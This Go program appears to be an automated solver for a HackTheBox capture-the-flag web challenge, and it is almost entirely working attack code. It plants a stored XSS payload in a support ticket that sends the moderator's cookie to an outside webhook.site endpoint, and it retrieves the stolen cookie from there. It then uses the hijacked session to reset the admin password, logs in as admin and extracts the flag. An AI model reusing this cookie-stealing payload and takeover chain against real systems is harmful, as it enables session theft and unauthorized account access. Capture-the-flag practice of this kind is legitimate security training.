package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "log"
    "net/http"
    "strings"
    "time"
)

//--------------------------------config-----------------------
const target = "IP:PORT" //chals target goes here
const flag = "HTB{"      //events flag prefix goes here

type Webhook struct {
    Uuid       string
    Created_at string
}

type Message struct {
    Message string
}

type WebhookRequests struct {
    Data []struct {
        UUID    int    `json:"uuid"`
        Method  string `json:"method"`
        Content string `json:"content"`
        Query   struct {
            Content string `json:"c"`
        } `json:"query"`
        Files []string `json:"files"`
    } `json:"data"`
    Total int `json:"total"`
}

func main() {

    fmt.Println("--------------------------------------------------------")
    fmt.Println("--------------Solve CHAL NAME          -----------------")
    fmt.Println("--------------by: Ir0nM4n-------------------------------")
    fmt.Println("--------------@: https://github.com/brennenwright-------")
    fmt.Println("\n-----Setup")

    //grab a new http endpoint for the solution
    values := map[string]string{"default_status": "200", "default_content": "Hello world!", "default_content_type": "text/html"}
    json_data, err := json.Marshal(values)

    resp, err := http.Post("https://webhook.site/token", "application/json", bytes.NewBuffer(json_data))
    if err != nil {
        log.Fatal(err)
    }

    defer resp.Body.Close()

    respJson, err := ioutil.ReadAll(resp.Body)

    var webhook Webhook

    json.Unmarshal(respJson, &webhook)

    //log to console the progress
    fmt.Println("Pulled a fresh webhook address at: https://webhook.site/#!/" + webhook.Uuid)

    //step one: attack the moderator with a ticket including XSS
    //'http://206.189.126.144:31128/api/tickets/add'
    fmt.Println("\n-----Step One: Moderator XSS")

    var payload = "{\"message\":\"<script>image = new Image(); image.src=\\\"https://webhook.site/" + webhook.Uuid + "?c=\\\"+document.cookie;</script>\"}"

    fmt.Println("sending payload:" + payload)

    resp, err = http.Post("http://"+target+"/api/tickets/add", "application/json", bytes.NewBuffer([]byte(payload)))
    if err != nil {
        panic(err)
    }

    defer resp.Body.Close()

    respJson, err = ioutil.ReadAll(resp.Body)
    if err != nil {
        log.Fatal(err)
    }

    var message Message
    json.Unmarshal(respJson, &message)

    fmt.Println(message.Message)

    //make sure the response is the one we are looking for
    if message.Message != "An admin will review your ticket shortly!" {
        fmt.Println("solution failed")
        return
    }

    //need to wait for the admin to do his thing
    time.Sleep(10 * time.Second)

    //if it worked check the webhook
    //'https://webhook.site/token/'+ token_id +'/requests?sorting=newest'
    resp, err = http.Get("https://webhook.site/token/" + webhook.Uuid + "/requests?sorting=newest")
    if err != nil {
        log.Fatal(err)
    }

    defer resp.Body.Close()

    respJson, err = ioutil.ReadAll(resp.Body)

    var webhookRequests WebhookRequests

    json.Unmarshal(respJson, &webhookRequests)

    fmt.Println(webhookRequests.Data[0].Query.Content)

    //set two: reset the admin password using the moderators session
    // get http://165.22.125.212:31732/api/users/update
    //{"password":"admin","uid":"1"}
    fmt.Println("\n-----Step Two: Borrow the Mods Session")

    fmt.Println("resting admin accounts password using the moderators session=" + webhookRequests.Data[0].Query.Content[8:])

    payload = "{\"password\":\"admin\",\"uid\":\"1\"}"
    fmt.Println("sending payload:" + payload)

    req, err := http.NewRequest("POST", "http://"+target+"/api/users/update", bytes.NewBuffer([]byte(payload)))
    if err != nil {
        panic(err)
    }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Add("Cookie", webhookRequests.Data[0].Query.Content)

    client := http.Client{}

    resp, err = client.Do(req)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()

    respJson, err = ioutil.ReadAll(resp.Body)
    if err != nil {
        log.Fatal(err)
    }

    json.Unmarshal(respJson, &message)
    fmt.Println(message.Message)

    //step three: login as the admin
    // http://206.189.126.144:31128/api/login
    fmt.Println("\n-----Step Three: Authenticate as the admin")

    payload = "{\"username\":\"admin\",\"password\":\"admin\"}"
    fmt.Println("sending payload:" + payload)

    resp, err = http.Post("http://"+target+"/api/login", "application/json", bytes.NewBuffer([]byte(payload)))
    if err != nil {
        log.Fatal(err)
    }

    defer resp.Body.Close()

    respJson, err = ioutil.ReadAll(resp.Body)

    //var webhookRequests WebhookRequests

    json.Unmarshal(respJson, &message)

    //make sure the response is the one we are looking for
    if message.Message != "User authenticated successfully!" {
        fmt.Println("solution failed")
        return
    }

    fmt.Println("User authenticated successfully!\nGot the auth cookie:\n")
    fmt.Println(resp.Header["Set-Cookie"][0])
    fmt.Println("Access the admin portal!")

    req, err = http.NewRequest("GET", "http://"+target+"/admin", nil)
    if err != nil {
        panic(err)
    }

    req.Header.Set("Cookie", resp.Header["Set-Cookie"][0])

    resp, err = client.Do(req)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()

    respJson, err = ioutil.ReadAll(resp.Body)
    if err != nil {
        log.Fatal(err)
    }

    //parse for the flag
    fmt.Println("\n-----Flag: ")
    i := strings.Index(string(respJson), flag)
    fmt.Println(string(respJson)[i : strings.Index(string(respJson)[i:], "}")+i+1])

}
